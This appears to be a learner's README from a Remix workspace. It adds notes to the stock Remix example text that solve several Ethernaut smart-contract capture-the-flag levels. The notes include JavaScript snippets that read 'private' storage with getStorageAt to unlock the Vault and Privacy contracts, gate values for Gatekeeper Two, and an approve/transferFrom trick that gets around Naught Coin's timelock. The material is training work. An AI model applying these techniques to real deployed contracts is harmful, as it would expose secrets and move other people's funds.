REMIX EXAMPLE PROJECT

Remix example project is present when Remix loads for the very first time or there are no files existing in the File Explorer. 
It contains 3 directories:

1. 'contracts': Holds three contracts with different complexity level, denoted with number prefix in file name.
2. 'scripts': Holds two scripts to deploy a contract. It is explained below.
3. 'tests': Contains one test file for 'Ballot' contract with unit tests in Solidity.

SCRIPTS

The 'scripts' folder contains example async/await scripts for deploying the 'Storage' contract.
For the deployment of any other contract, 'contractName' and 'constructorArgs' should be updated (along with other code if required). 
Scripts have full access to the web3.js and ethers.js libraries.

To run a script, right click on file name in the file explorer and click 'Run'. Remember, Solidity file must already be compiled.

Output from script will appear in remix terminal.

### Vault

https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188

Was solved using just Javascript with the help of 

https://cmichel.io/ethernaut-solutions/

```
await contract.unlock( (
    await web3.eth.getStorageAt(contract.address, 1)
) );
```
### Re-entrancy

https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D

I am not sure I fully get how this worked. The first try, using [ReentranceAttack.sol from Ethernaut](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/attacks/ReentranceAttack.sol), did not work. However, using [Christoph Michel](https://cmichel.io/ethernaut-solutions/) did work. 

I need to study this topic further since it is one that has recently been used (I think with Elephant.money).

Maybe take a look at ... 

* https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942
* https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/
* https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742
* https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern


### Privacy

https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B

This one was similar to the Vault, where I needed to access the private value via the `getStorageAt()` function. That part I go right, but I struggled with processing the value correctly. 

```
const keyData = await web3.eth.getStorageAt(contract.address, 5);

// keyData = 0xb301d4297362fcf4a1c2af4cf9d84bbdfcc7b45ad2ab96796b13229669b609aa

const key16 = `${keyData.slice(0, 34)}`

// '0xb301d4297362fcf4a1c2af4cf9d84bbd'

await contract.unlock( key16 )

```

### Gatekeeper Two
_Difficulty 6/10_

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:
* Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
* The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
* The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.

```
0: uint256: 0
1: uint64: 14006537356739165594
2: uint64: 18446744073709551615
```

### Naught Coin

```
contract.approve(player, (await contract.balanceOf(player)).toString());
contract.transferFrom(player, '0xf332295db2AA2d8A6FDdD4a2C8f342EE40CC2DcC', (await contract.balanceOf(player)).toString());

```